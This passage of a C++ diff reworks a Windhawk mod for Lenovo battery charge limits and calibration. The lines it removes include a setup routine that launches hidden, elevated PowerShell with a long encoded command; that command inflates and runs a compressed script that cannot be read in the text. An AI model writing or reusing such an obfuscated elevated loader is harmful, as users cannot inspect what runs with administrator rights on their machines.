+    if (recovery.prior[i].enabled && !current.packs[i].enabled)
+      needed = true;
+  }
+  if (!needed)
+    return Clear();
+  if (IntegratedBackend()) {
+    for (int i = 0; i < 2; i++)
+      if (recovery.prior[i].enabled && !current.packs[i].enabled)
+        if (!RestorePack(i + 1, recovery.prior[i]))
+          return false;
+  } else {
+    State prior;
+    std::copy(std::begin(recovery.prior), std::end(recovery.prior), prior.packs);
+    Summarize(prior);
+    // The vendor CLI cannot select a battery. Never overwrite another battery's newer range.
+    if (prior.mixed || current.enabled) {
+      Status(
+          L"Individual battery restoration requires the integrated backend. Select it in Windhawk "
+          L"Settings or restore the limits in Vantage.");
+      return false;
+    }
+    if (!Set({true, true, prior.start, prior.stop}))
+      return false;
+  }
   return Clear();
 }
 void Full() {
@@ -662,26 +1151,30 @@ void Full() {
     Error();
     return;
   }
+  if (!IntegratedBackend() && state.mixed) {
+    Status(
+        L"These batteries have different limits. Select the integrated backend in Windhawk "
+        L"Settings to preserve and restore each battery's limits.");
+    return;
+  }
   Recovery next;
   next.active = 1;
-  next.start = state.start;
-  next.stop = state.stop;
   next.deadline = Now() + 8 * 3600;
+  std::copy(std::begin(state.packs), std::end(state.packs), next.prior);
   if (!Save(next) || !Set({true, false, 0, 0})) {
     Error();
     return;
   }
   Status(L"Charge-to-full request saved.");
 }
-// END TESTABLE RESTORE
 void Refresh() {
   State state = Query();
   {
     std::lock_guard lock(stateMutex);
     if (state.valid && !state.enabled) {
-      if (Active() && ValidRange(recovery.start, recovery.stop)) {
-        state.start = recovery.start;
-        state.stop = recovery.stop;
+      if (Active() && ValidRange(recovery.prior[0].start, recovery.prior[0].stop)) {
+        state.start = recovery.prior[0].start;
+        state.stop = recovery.prior[0].stop;
       } else if (ValidRange(snapshot.state.start, snapshot.state.stop)) {
         state.start = snapshot.state.start;
         state.stop = snapshot.state.stop;
@@ -691,299 +1184,256 @@ void Refresh() {
     snapshot.revision++;
     refreshing = false;
   }
-  Engine::SetInt(L"cacheValid", state.valid);
-  Engine::SetInt(L"cacheEnabled", state.enabled);
+  Wh_Log(L"cacheValid=%d", int(state.valid));
+  Wh_Log(L"cacheEnabled=%d", int(state.enabled));
   if (state.valid && state.enabled) {
-    Engine::SetInt(L"cacheStart", state.start);
-    Engine::SetInt(L"cacheStop", state.stop);
+    Wh_Log(L"cacheStart=%d", int(state.start));
+    Wh_Log(L"cacheStop=%d", int(state.stop));
   }
 }
-// BEGIN TESTABLE SETUP COMMAND
-std::wstring SetupCommand(const std::wstring& system,
-                          const std::wstring& args,
-                          const std::wstring& scratch) {
-  auto powershell = system + L"\\WindowsPowerShell\\v1.0\\powershell.exe";
-  auto native = system + L"\\cmd.exe";
-  auto windows = system.substr(0, system.find_last_of(L'\\'));
-  // No command-form FOR: even a /d parent otherwise spawns an AutoRun-enabled child.
-  // The caller supplies a fresh directory beneath a verified protected parent.
-  if (system.find_first_of(L"\"%&|<>^!()") != system.npos ||
-      scratch.find_first_of(L"\"%&|<>^!()") != scratch.npos || scratch.empty())
-    throw 1;
-  auto file = scratch + L"\\e";
-  auto acl = L"\"" + system + L"\\icacls.exe\" \"" + scratch + L"\"";
-  auto fail = L"(rmdir \"" + scratch + L"\" 2>nul & exit /b 20)";
-  auto protect =
-      acl +
-      L" /inheritance:r /grant:r \"*S-1-5-32-544:(OI)(CI)F\" \"*S-1-5-18:(OI)(CI)F\" >nul || " +
-      fail + L" & " + acl + L" /setowner *S-1-5-32-544 >nul || " + fail + L" & ";
-  std::wstring command =
-      L"/d /e:on /v:off /s /c \"mkdir \"" + scratch + L"\" || exit /b 20 & " + protect +
-      L"set > \"" + file + L"\" || (del \"" + file + L"\" 2>nul & rmdir \"" + scratch +
-      L"\" 2>nul & exit /b 20) & (for /f \"usebackq delims==\" %V in (\"" + file +
-      L"\") do @set \"%V=\") & del \"" + file + L"\" & rmdir \"" + scratch +
-      L"\" & set \"SystemRoot=" + windows + L"\" & set \"WINDIR=" + windows +
-      L"\" & set \"ComSpec=" + native + L"\" & set \"PATH=" + system +
-      L"\" & set \"PATHEXT=.COM;.EXE;.BAT;.CMD\" & set \"TEMP=" + windows +
-      L"\\Temp\" & set \"TMP=" + windows + L"\\Temp\" & set \"PSModulePath=" + system +
-      L"\\WindowsPowerShell\\v1.0\\Modules\" & \"" + powershell + L"\" " + args + L"\"";
-  if (command.size() > 8000)
-    throw 1;
-  return command;
+namespace AdvancedControls {
+struct Snapshot {
+  NativeRpc::Advanced data;
+  ULONGLONG revision = 0;
+  std::wstring message;
+};
+std::mutex mutex;
+Snapshot snapshot;
+struct CalibrationRecord {
+  DWORD magic = 0x43414c31, slot = 0, observed = 0, reserved = 0;
+  Pack prior[2]{};
+};
+CalibrationRecord calibration;
+bool invalidCalibration = false;
+Snapshot Read() {
+  std::lock_guard lock(mutex);
+  return snapshot;
 }
-PCWSTR SetupResult(DWORD code) {
-  switch (code) {
-    case 0:
-      return L"Lenovo utility is installed and verified.";
-    case 20:
-      return L"Setup could not create a protected folder. Check folder permissions.";
-    case 21:
-      return L"Download failed. Check your connection and try again.";
-    case 22:
-      return L"Lenovo's download has changed. Update this mod for a reviewed utility version.";
-    case 23:
-      return L"Lenovo's publisher signature could not be verified. Nothing was installed.";
-    case 24:
-      return L"The utility could not be installed. Check folder permissions or whether it is in "
-             L"use.";
-    default:
-      return L"Setup did not complete. Check Lenovo support or try again.";
-  }
+void Publish(const NativeRpc::Advanced& data, const std::wstring& message = L"") {
+  std::lock_guard lock(mutex);
+  snapshot.data = data;
+  snapshot.message = message;
+  snapshot.revision++;
 }
-// END TESTABLE SETUP COMMAND
-std::wstring SetupScratch() {
-  PWSTR raw = nullptr;
-  if (FAILED(SHGetKnownFolderPath(FOLDERID_ProgramFiles, KF_FLAG_DEFAULT, nullptr, &raw)))
-    throw 1;
-  std::wstring root(raw);
-  CoTaskMemFree(raw);
-  auto attributes = GetFileAttributesW(root.c_str());
-  if (attributes == INVALID_FILE_ATTRIBUTES || (attributes & FILE_ATTRIBUTE_REPARSE_POINT) ||
-      !ProtectedObject(root) || !ProtectedObject(root.substr(0, 3), true))
-    throw 1;
-  GUID id{};
-  if (FAILED(CoCreateGuid(&id)))
-    throw 1;
-  wchar_t text[40]{};
-  StringFromGUID2(id, text, 40);
-  return root + L"\\TBC-setup-" + text;
+bool SaveCalibration(CalibrationRecord next) {
+  if (!Wh_SetIntValue(L"CalibrationPresent", 1) ||
+      !Wh_SetBinaryValue(L"Calibration", &next, sizeof(next)))
+    return false;
+  calibration = next;
+  invalidCalibration = false;
+  return true;
 }
-// BEGIN TESTABLE SETUP FLOW
-DWORD WINAPI SetupThread(void*) noexcept {
-  try {
-    HRESULT com = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
-    struct ComCleanup {
-      HRESULT hr;
-      ~ComCleanup() {
-        if (SUCCEEDED(hr))
-          CoUninitialize();
-      }
-    } comCleanup{com};
-    wchar_t system[32768];
-    if (!GetSystemDirectoryW(system, 32768))
-      throw 1;
-    std::wstring powershell = std::wstring(system) + L"\\WindowsPowerShell\\v1.0\\powershell.exe";
-    std::wstring args =
-        L"-NoProfile -NonInteractive -EncodedCommand "
-        L"JABtAD0AWwBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQBdADoAOgBuAGUAdwAoAFsAQwBvAG4AdgBlAHIAd"
-        L"ABdADoA"
-        L"OgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBwAFYAZAA1AGMAOQBwAEcARgBQACsAZgBUADcAR"
-        L"gBOAG0A"
-        L"SgBHAFkAVwBrAEoAZwB3AEkAQQBuADAAdwBvAFEAQwBaADMAWQBVAEcATQBuADAAMwBFADgAbQBVAFYANgB3AEQAW"
-        L"gBDAHEA"
-        L"NgB4AFcASABFADMAOAAzAGYAdABXAEUAZwBKAHMANAA4AFEAdABNADcAYQBPAGQAKwB3ADcAZgB1AC8AUQBhACsAS"
-        L"QBzAEoA"
-        L"dQBCADUANABKAEUASQBaAEIAeQBhAHAATQBkAEoAdwBDAFUAQgBIADUAWgBVAEEAcQBGAGsAeABjAFcAWABLAEsAU"
-        L"QB1AEUA"
-        L"SgBlAEgARwA3AE0AUQBVAGsARQBYACsAbQAyADAAWQB0AEsAZAAzAHgAWAAvAGoAQgBuAEkAVQBxAEgAbwBDAE0AR"
-        L"wBGADcA"
-        L"VQByAEcAZwA1AEcAQQBLAFEAZwBJAFUATwBRAE4AMABjAGEAUwBoADEAcQBoAEMATQBHAHkAUABSAHAAZgBjAEMAL"
-        L"wAyAFkA"
-        L"VQBUAGwASABFAG4ARgAwAGYAagBkADgATQBJAGgAdgB4AEwAdABVADAAcQBJAEYATwBNADYAQgBGAGUAQwA5ADQAN"
-        L"QBHAGkA"
-        L"awBuAHIAdABpAG8AdAB4ADYAbgAyAGIAYwBkAHUAVwBXAGUAVgBSAHEAdgB2AFcATgBWAHEAdABkAE4AcgBkAGkAc"
-        L"QBkAG4A"
-        L"bgBYAG0AVwBLAGQATwB3ADIANAA2AEYAYQB2AFIANgB6AHYAMgBtAGUATgBZAGQAcwB0AHUAZABaADIANgA0AHoAU"
-        L"gBQAG0A"
-        L"eABhAHEAVABGAHkANwA0AHUAagBXAEcALwBJAEgAWgA0AEcAUgBHAEsARABmAE8AcwBHAFMAQwBSADQAcwBJAEoAQ"
-        L"gAzADcA"
-        L"ZgBaAGIAawBIADMAdQBlAHkAQQBVAFYAZABkAEcAZwBzAC8AUQAwAHoANQBUAFoAcABWAEsAUgBMAHUAZQBzACsAR"
-        L"ABMAGkA"
-        L"SABxAGsAUQA2AFUARQBzAFMARgBkAEgAawBqAEIAZgBXAFcAMABGAEgARwBFAE4AbgA4AFUARABDAGsAUgBIAHYAT"
-        L"wA3AHIA"
-        L"bwAyAE4AaQBsAEUAMwBLAGsAMwB0AEoATABzADkAcgBSAHIAMQBXAGkAMQAvAGIARgBwAEcAcQA5ADYAdwByAEcAY"
-        L"QB6AGkA"
-        L"YgBSAGEAcABWAG0AdgBWAGgAdQAxAEYAawBxAGMAVgBpAHcAMAB2AEYAYgBEADIALwBwAHAAdABWAFYAdABuAEYAY"
-        L"QBNAGEA"
-        L"dgBXAHMAVQBqAHQAcgAxAGgAbwAxAHIAVgBTAFkAeABrAEUAUwBhAFcASgBIAEUAUQBoAHAAbwBLADAAeQBDAFYAc"
-        L"QBQAEMA"
-        L"YgB4AHkAcwBjAEUARQBTAGMARwBDADIAVgAwAHgAUgBHADkASwA1AEYAdQBCADQASwArAEkANQBpADMAUQBPAG4AV"
-        L"ABWAEcA"
-        L"SwBoAGIANAA3ADAAeQBtAFAAcABKAFEAQgBKAFcAWQB2AFMANQBjAEMARgBoAFoAMQBPAGkALwA1AEwASQBtAEsAU"
-        L"AB4AEkA"
-        L"RgBMACsAVQBoAGEAQQBJAEEAWQBYAFIARQA4AEoAdABzAFIAegBKAHIARwBFAGkAQgBnAFQARwBuAGoAawBkAGoAQ"
-        L"QAwAFYA"
-        L"ZABCADIAQgBJAHoAdABGAFMAQgBzAEkAaABoAGgAOABDAFgARwA4AGgAdQBSAGMAOABGAFgANQBOAFYATgBFAE4AR"
-        L"QBwAHAA"
-        L"TgBnAGoAMwB0AGIANABkAG0AcgBLAEsAMwBLAGYAVwBrADEAZABQAHoAUABhAHgAcgB2AEgATgBxAGQAYwBmAEsAV"
-        L"gBNAGUA"
-        L"NQBPAHcAbQA4AGcAOABWAE0ALwA2ADcAUgBqAGMARwBOAE8AeQBNAFUAYwBZAEQANQBlAEYAMQBEAGUAMwByAHcAW"
-        L"QBlAFoA"
-        L"cAA1AE4ARwBZAGkANwBrAHYAbQBCACsAdgBIAE8ANwBVAHkAYgBnAGIAWABBAEEAdgBJAGcAdgB3AGMATwBaAEMAU"
-        L"wBTAEMA"
-        L"bQBCAE8AbgBuAGQAbQB5AGcAVgBRAEYAOQBGAFgARgBBAGgANABvAHAAUgBuADkAdABxAHUAQwAxAEYAMABwAGMAc"
-        L"ABBAFYA"
-        L"dwBmAEMAUwBmAHIALwBaAHoAMwBZAEoAagBsADMAUQBSADIAQQBNAGoAeQBrAE0ANgByAFEAMAB2AGYAcABMAE0AO"
-        L"QBTAHIA"
-        L"agBRADkATgBzAFAAeQBJADMAYgBNADMAUwBDAFkAQQAzAEkATwBBADMAKwBqAEgASABlAFIAawB3AFUAeABaAFAAN"
-        L"gBvADMA"
-        L"MgB1AFMAQgBLAGIAcwBZAGQAZgBBAGkAOQAxADkAWAAwADYAagBJAGQAaABzAEwAcQBNAFQAQQBtAHYAWABqAHoAM"
-        L"gBFAEkA"
-        L"MABIAG4AdgBlAHkAMQBtAGMAcwBYAFYAMABwAGMAbABjADAAeABzAHgAUwBnAHgAaAB1AE0AOAArAEkAcQBrAGIAM"
-        L"gB6ADEA"
-        L"cABaAGwAOQBhAHgASwB2AGYARwBFAHoAdwBlAHkAMQA1AHMAUQBpAEEARgBmAGkAVwBiADcAUABsADkAcAB4AEYAR"
-        L"AArAFoA"
-        L"NQB3AFAAOQBXAGIAUgB5AFEAdwBxAHAAYgB3AHAAYQB4AHAAcQB1AGIAbgBhAE4AcgBjAFUATQBjAGMAaABrAGgAd"
-        L"QBtAGYA"
-        L"aABsAGMAeABvAGYAWQBJAEMANABOAHkAQQBUAEkAZwBuAHMAcQBpAFIANgBaAGIAQQBoAEYAZgBSAGgAdwBRAGwAM"
-        L"gBYAHgA"
-        L"NABIAGMAdwBpAGYAWABsAG8AYgA5AHYAbgBDAC8ANgB3AEsARABnAEUAbABHAGYAZgBZAFAALwBIAFEAbgBTAEUAc"
-        L"ABiAHYA"
-        L"NABaAEkAcABzADMAdwBjAFYARQBkADQAQwBrAHIAdwBVAHQAWQBHAGMAUABKADMANgBpAFkASABFAGwAVQBmAHUAe"
-        L"QBXAGYA"
-        L"cQBBAEMAYwBTAHUAMwBoAEIANQBFAHIAbQBBAGgAOABvADQAOQB6ADgAZQBtAHMAOQBDADEAWQBiAHQAagB2ADgAV"
-        L"wAvAFgA"
-        L"bgB1AGsAMgArAGYARABRAFgAZAB3ADMAcgBmAFAAegA4AC8ASABmADUAVQBPAG4AagB0ADIALwBtAHkAdABLADEAW"
-        L"ABMAG8A"
-        L"aQAzADEAOQBxAGEARQB2AFgARgA3AG4AdQBwAEQAdQBUAFUASQA0AHkANQBDAFQAOABJAHUATABJAG0AVABKADgAc"
-        L"QBxAEUA"
-        L"dgBsAE8AaAByAEUAMABMAG0AUABmAEwAKwB4AEMAZgBMAFMAMwBaAGsAMwBuAHYAbABDAGMAVQB1AGIASABBAHIAc"
-        L"gBjAFUA"
-        L"NgBPAHUAYQBoAFUAawBVAHIALwA5AFEAUABwAGwAYwB5AGQAUgA5AG0AeQBDAHkAVwA2ACsAcABZADMAUQB3ADYAe"
-        L"QB5AEkA"
-        L"SwBuAGgAZwA0AEcAMwBOAHcAZQAxADcAcAB5AEsARwBWAHoAUABCAFUAUgB6AFAATgB5AEUATgBXAGcANQBNAEkAN"
-        L"wBpAFkA"
-        L"awA5AHoAVgBoAHYANgBrAFYARwB5AGIAMABNADYAVQBVAHIALwBaAFYAVABrAGoAUgBhAG4ATAAyAEEAYgBZAFUAc"
-        L"gByAGoA"
-        L"TQBTAFMAKwBRAGcAaAB3AGkASgBjAFUARQBRAHEAUQBFAEkAbABZAFcAcgBiAG8AWQBFADIAaABWAHgAUQBqAE0AK"
-        L"wBSAEcA"
-        L"TwBpADMAYgAyAFAAbQA0AFkAbQBJAGEAbgBXAG4AbAA4AHgAcgBQAGsANQBxAFIAUwArAHAAcABjAFQAMABzAEkAd"
-        L"gA1AG4A"
-        L"SABvAFoAcQBuAGIASgBUAGYAQgAxAEMAUgBMAHgATABKAGIATQBUAFkAMgA5AG8AQQBHAGQAWQBTAE4AdQB0ADcAY"
-        L"wBRAFYA"
-        L"NwBuAGkATABsAGUAVgBrADMARQBmAHYAbABlAHQAQwBkAG0AdgAvAGEAaABTADMAZABYAEoAQQAxAEIAVgBjAHMAb"
-        L"wBnAFcA"
-        L"UABJAHYAWQBIAHkARQB5AFIAVgA4AGoAVABIAEEAeABMAGkASgBvAEUATQBqADUAbwA0AHcAQQBpAG8AdwB4AG8AM"
-        L"QBnAFIA"
-        L"SgB0AEwARwBVAGIAdABjAG4AbAByAHYAKwBsAEQAdwBKAGYAYwBkAFAAbQBpAEgATAByAHUAWgBCAEsAVgBwAFYAc"
-        L"ABtAGwA"
-        L"aABRAEgAKwBnAHcAKwBRADEAQgBlAEEASgBZAHYARABjAE8AbwAvAEMARgA5AFcAWAA2AEEAawBQAEoAVABpAEMAR"
-        L"QBHADEA"
-        L"bwAzAEsANABIADYANABqAFcAdQAyAEEAQgA2AHIAUQBpAGMATgA2ADYAaABmADEAWQBQAEcAbgBlAEIASQBhAFUAc"
-        L"gBXAHYA"
-        L"awBNAHMANwBhAG0AMgAvAFIAbgBIAEMATQA0AFgAWgBQAHoATwByAHQAWQBiAEoAVABQAGwARAA5AEMAQwAvAGMAV"
-        L"gB4AEQA"
-        L"egBnADMAZwBZAEEAbABnAHgAVgAyADEAegBsAFMAYwBvAEEAOABaAGQAUABwAGoAaABLAHgARwBjAEkAWABhAGQAd"
-        L"gBOAEkA"
-        L"OABhAHUAagBBAFAAQQBSAGQAWgB4AFQAagB0AGkANgBPAEYATQB5AGwAVwBaAFkANABuAFgASwBEAEYAWAB3ACsAb"
-        L"gBCAFAA"
-        L"QwAxAFoAcABmAFkANQA4AEEANQBFAEYAMQBzAEgARABnAFEAWABHADUAWQA1AGoAdABPAEcAcQArAGIATQBnAHUAT"
-        L"ABPAFQA"
-        L"VABUADkATgAxAGIANgBOAEgAbQBmAEoAUABYAFQAUgBOAHQAegBGAGkARwBpADEASgBLAFUAUgBuAFoANgBuAC8AT"
-        L"wA2AGwA"
-        L"bABNAHUAKwBCAEsAZQBxAHUAYQA5AEQAUABUADIAQwB2AHUASgBLAG4ALwA1AHgARQBoAEcAOABQADgAZgBGAHYAd"
-        L"QBEAFkA"
-        L"bgA5AEkASABCADgAUQA0AHkAZgAzAHkAUQBPAFgAawBKAHcAWgByAHcAegBLAEoAYgBXAGIAcgBQADgAcwBjAFQAR"
-        L"gBTAGMA"
-        L"OQBzAGsAVwBJAGkARQB4AHAASgBqAGgAcABpAEwAQQB6ADUAeQBNAFoAUgBpAGcAMwBIAC8AbgBoAHkAawB2AEUAW"
-        L"AA0AEgA"
-        L"QgA2AG0AUAA5ADIAYgBrADEAcwBEADYAeQB6ADIAcABTAG4AWABjAHMALwBtAGQAQwBOAFAAdgA3AGsAZQBiAEIAa"
-        L"QAyADUA"
-        L"eABuAHAAcgBxAE4ARwB6ADIATABpAGIAeQA3AHAAQQBrAGkANgAzAFoAZwBmAFcAWQBEAGQASQBEAEoAVgA2AEsAS"
-        L"QBEAHUA"
-        L"ZABzAEQAawBuAG0AQgBxAGMASAB5ADcALwBDADEAYQBtAFIAegB2AHQASwAxAEQARQB6AGIAcABxAHQAVwB1AE0AM"
-        L"AB6AEgA"
-        L"cAA4ADgAOAA2AFgAMABhAE4AVAB1AGIAVABSAGsAaQBuAEgAMwAvAGMAMwBEAE4AWABZAFAAZgBNAG4ARQBPAFQAY"
-        L"QBjAGMA"
-        L"cgA3AGsAQQArAE0ASwBGAGoAOABHAGMAdwBMAFoAMwBVAGEARgA2ADUAaQBxAHIAOQAyAEcAbABFAGQAYQBqAFIAN"
-        L"QA1AFcA"
-        L"RABqAFoAawB2AEQAQwBxAFAAOAB3ADIAdgBqAGQAbQBPADIASQBYAHYASQBoAGoAagAwADcAVgBGAHQAMQBtADIAZ"
-        L"wA0AGsA"
-        L"NABxAGYAVABXAGYAdABRAHEAagBnAHUAUgBVAHUAdgBTAGoAZwBqAHgAegBCAFAAZQBaAGYAJwApACkAOwAkAGQAP"
-        L"QBbAEkA"
-        L"TwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AXQA6ADoAbgBlAHcAK"
-        L"AAkAG0A"
-        L"LABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AM"
-        L"AApADsA"
-        L"JgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AEMAcgBlAGEAdABlACgAWwBJAE8ALgBTAHQAcgBlAGEAb"
-        L"QBSAGUA"
-        L"YQBkAGUAcgBdADoAOgBuAGUAdwAoACQAZAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAgAC0AUQB1AGkAZ"
-        L"QB0AA==";
-    std::wstring native = std::wstring(system) + L"\\cmd.exe";
-    auto command = SetupCommand(system, args, SetupScratch());
-    SHELLEXECUTEINFOW info{sizeof(info)};
-    info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
-    info.lpVerb = L"runas";
-    info.lpFile = native.c_str();
-    info.lpParameters = command.c_str();
-    info.lpDirectory = system;
-    info.nShow = SW_HIDE;
-    SetupStatus(L"Waiting for Windows setup approval.");
-    if (!ShellExecuteExW(&info) || !info.hProcess) {
-      SetupStatus(L"Setup was cancelled or could not start.");
-      setupRunning = false;
-      return 0;
-    }
-    Handle process(info.hProcess);
-    SetupStatus(L"Installing Lenovo utility...");
-    HANDLE waits[] = {stopEvent, process.value};
-    auto result = WaitForMultipleObjects(2, waits, FALSE, INFINITE);
-    if (result == WAIT_OBJECT_0 + 1) {
-      DWORD code = 1;
-      GetExitCodeProcess(process, &code);
-      SetupStatus(SetupResult(code));
-    } else
-      SetupStatus(L"Setup continues separately while the mod stops.");
-  } catch (...) {
-    SetupStatus(L"Unable to start Lenovo utility setup.");
-  }
-  setupCompleted = true;
-  setupRunning = false;
-  if (!unloading)
-    SetEvent(wakeEvent);
-  return 0;
+void LoadCalibration() {
+  DWORD n = Wh_GetBinaryValue(L"Calibration", &calibration, sizeof(calibration));
+  invalidCalibration =
+      (n != sizeof(calibration) && (n || Wh_GetIntValue(L"CalibrationPresent", 0))) ||
+      calibration.magic != 0x43414c31 || calibration.slot > 2 || calibration.observed > 1 ||
+      calibration.reserved;
+  for (auto p : calibration.prior)
+    if (p.present > 1 || p.enabled > 1 || (p.enabled && !ValidRange(p.start, p.stop)))
+      invalidCalibration = true;
+  if (invalidCalibration)
+    Status(L"Calibration recovery is invalid. Check charging limits in Lenovo Vantage.");
 }
-void SetupUtility(bool redo = false) {
-  if (setupRunning.exchange(true))
+bool ThresholdWritesAllowed() {
+  if (!IntegratedBackend())
+    return !calibration.slot && !invalidCalibration;
+  if (calibration.slot || invalidCalibration)
+    return false;
+  NativeRpc::Session s;
+  if (s.Connect(GetTickCount64() + 3000))
+    return false;
+  long b = 0, stage = 0, stages = 0;
+  return !NativeRpc::CalibrationState(s.context, &b, &stage, &stages) && b == 0 && stage == 0;
+}
+void RefreshAdvanced() {
+  if (!IntegratedBackend()) {
+    Publish({}, L"Select Integrated Lenovo service in Windhawk Settings to use Advanced controls.");
     return;
-  if (setupThread) {
-    if (WaitForSingleObject(setupThread.load(), 0) != WAIT_OBJECT_0) {
-      setupRunning = false;
-      SetupStatus(L"Previous setup is finishing. Try again shortly.");
+  }
+  auto a = NativeRpc::ReadAdvanced(GetTickCount64() + 5000);
+  Publish(a,
+          a.connected ? L"" : L"Lenovo service could not be reached. No controls are available.");
+}
+// Run only on the single worker. Revalidate support immediately before every write.
+void ApplyUsb(int value) {
+  auto a = NativeRpc::ReadAdvanced(GetTickCount64() + 5000);
+  if (!IntegratedBackend() || !a.usbSupported || value < 0 || value > 2) {
+    Publish(a, L"USB setting is unavailable. Nothing changed.");
+    return;
+  }
+  NativeRpc::Session s;
+  long actual = -1;
+  bool ok = !s.Connect(GetTickCount64() + 3000) &&
+            !NativeRpc::LongWrite(s.context, NativeRpc::procSetUsb, value) &&
+            !NativeRpc::LongRead(s.context, NativeRpc::procUsbValue, &actual) && actual == value;
+  a = NativeRpc::ReadAdvanced(GetTickCount64() + 5000);
+  Publish(a, ok ? L"USB power setting applied."
+                : L"USB change was not confirmed. Refresh to check its current value.");
+}
+void CheckCalibration() {
+  if (!calibration.slot || invalidCalibration || !IntegratedBackend())
+    return;
+  auto a = NativeRpc::ReadAdvanced(GetTickCount64() + 5000);
+  if (!a.resetKnown) {
+    Publish(a, L"Calibration status unavailable. Saved limits are retained.");
+    return;
+  }
+  if (a.resetBattery == long(calibration.slot)) {
+    if (!calibration.observed) {
+      auto next = calibration;
+      next.observed = 1;
+      SaveCalibration(next);
+    }
+    Publish(a, L"Calibration is running. Keep your laptop plugged in.");
+    return;
+  }
+  if (a.resetBattery != 0) {
+    Publish(a, L"Another battery is calibrating. Saved limits are retained.");
+    return;
+  }
+  // An ambiguous start is never retried. Once idle is confirmed, preserve any newer enabled range.
+  auto state = Query();
+  bool restored = state.valid;
+  for (int i = 0; i < 2; i++)
+    if (state.packs[i].present != calibration.prior[i].present)
+      restored = false;
+  if (restored)
+    for (int i = 0; i < 2; i++)
+      if (calibration.prior[i].present && calibration.prior[i].enabled)
+        restored = RestorePack(i + 1, calibration.prior[i]) && restored;
+  if (restored && SaveCalibration({}))
+    Publish(
+        a,
+        L"Calibration is idle. Charging protection checked; newer enabled ranges were preserved.");
+  else
+    Publish(a,
+            L"Calibration is idle, but protection could not be verified. Saved limits are "
+            L"retained. Check Lenovo Vantage.");
+}
+void Calibration(int slot, bool stop) {
+  auto a = NativeRpc::ReadAdvanced(GetTickCount64() + 5000);
+  if (!IntegratedBackend() || slot < 1 || slot > 2 || !a.batteries[slot - 1].present ||
+      !a.batteries[slot - 1].resetCapable || !a.resetKnown) {
+    Publish(a, L"Calibration is unavailable for this battery.");
+    return;
+  }
+  if (!stop) {
+    SYSTEM_POWER_STATUS power{};
+    if (Active() || calibration.slot || invalidCalibration || a.resetBattery != 0 ||
+        !GetSystemPowerStatus(&power) || power.ACLineStatus != 1) {
+      Publish(
+          a, L"Connect power and end any charge-to-full or calibration operation before starting.");
       return;
     }
-    CloseHandle(setupThread.load());
-    setupThread = nullptr;
-  }
-  if (!redo && ReadSnapshot().state.valid) {
-    SetupStatus(L"Lenovo utility is already ready.");
-    setupRunning = false;
+    auto state = Query();
+    if (!state.valid) {
+      Publish(a, L"Charging limits could not be saved. Calibration did not start.");
+      return;
+    }
+    CalibrationRecord next;
+    next.slot = slot;
+    std::copy(std::begin(state.packs), std::end(state.packs), next.prior);
+    if (!SaveCalibration(next)) {
+      Publish(a, L"Charging limits could not be saved. Calibration did not start.");
+      return;
+    }
+  } else if (a.resetBattery != slot) {
+    Publish(a, L"This battery is not currently calibrating.");
     return;
   }
-  SetupStatus(L"Starting setup...");
-  setupThread = CreateThread(nullptr, 0, SetupThread, nullptr, 0, nullptr);
-  if (!setupThread) {
-    setupRunning = false;
-    SetupStatus(L"Unable to start Lenovo utility setup.");
+  NativeRpc::Session s;
+  DWORD error = s.Connect(GetTickCount64() + 3000);
+  if (!error)
+    error = NativeRpc::LongWrite(s.context,
+                                 stop ? NativeRpc::procStopReset : NativeRpc::procStartReset, slot);
+  auto after = NativeRpc::ReadAdvanced(GetTickCount64() + 5000);
+  if (!stop && after.resetKnown && after.resetBattery == slot) {
+    auto next = calibration;
+    next.observed = 1;
+    SaveCalibration(next);
   }
+  Publish(after,
+          error ? L"Calibration command was not confirmed. Refresh before taking another action."
+          : stop
+              ? L"Cancellation requested. Refresh to verify that calibration has stopped."
+              : L"Calibration requested. Keep the laptop connected and refresh to see its state.");
 }
-// BEGIN TESTABLE DISPATCH
-// END TESTABLE SETUP FLOW
+bool ApplySeparate(unsigned value) {
+  if (!IntegratedBackend() || !ThresholdWritesAllowed())
+    return false;
+  Pack target[2];
+  for (int i = 0; i < 2; i++) {
+    int start = (value >> (i * 16)) & 255, stop = (value >> (i * 16 + 8)) & 255;
+    if ((start || stop) && !ValidRange(start, stop))
+      return false;
+    target[i] = {1, DWORD(stop != 0), start, stop};
+  }
+  auto before = Query();
+  if (!before.valid || !before.packs[0].present || !before.packs[1].present)
+    return false;
+  NativeRpc::Session s;
+  if (s.Connect(GetTickCount64() + 3000))
+    return false;
+  bool ok = true;
+  int attempted = 0;
+  for (int i = 0; i < 2; i++) {
+    attempted = i + 1;
+    NativeRpc::Battery actual;
+    if (NativeRpc::Write(s.context, i + 1, target[i].start, target[i].stop) ||
+        NativeRpc::Read(s.context, i + 1, &actual) || actual.capable != 1 ||
+        actual.enabled != target[i].enabled ||
+        (actual.enabled && (actual.start != target[i].start || actual.stop != target[i].stop))) {
+      ok = false;
+      break;
+    }
+  }
+  if (!ok) {
+    // Best-effort rollback only when this operation's exact value is still present.
+    for (int i = 0; i < attempted; i++) {
+      NativeRpc::Battery now;
+      if (!NativeRpc::Read(s.context, i + 1, &now) && now.capable == 1 &&
+          now.enabled == target[i].enabled &&
+          (!now.enabled || (now.start == target[i].start && now.stop == target[i].stop))) {
+        auto p = before.packs[i];
+        NativeRpc::Write(s.context, i + 1, p.enabled ? p.start : 0, p.enabled ? p.stop : 0);
+      }
+    }
+    Status(
+        L"Both ranges were not confirmed. Original limits were restored where possible. Refresh "
+        L"and check each battery.");
+    return false;
+  }
+  return Clear();
+}
+}  // namespace AdvancedControls
+
 void Dispatch(int action, int values) {
-  if (action == 7) {
-    SetupUtility(values != 0);
+  if (action >= 20 && action <= 24) {
+    if (action == 20)
+      AdvancedControls::RefreshAdvanced();
+    if (action == 21)
+      AdvancedControls::ApplyUsb(values);
+    if (action == 22 || action == 23)
+      AdvancedControls::Calibration(values, action == 23);
+    if (action == 24) {
+      if (AdvancedControls::ApplySeparate(static_cast<unsigned>(values)))
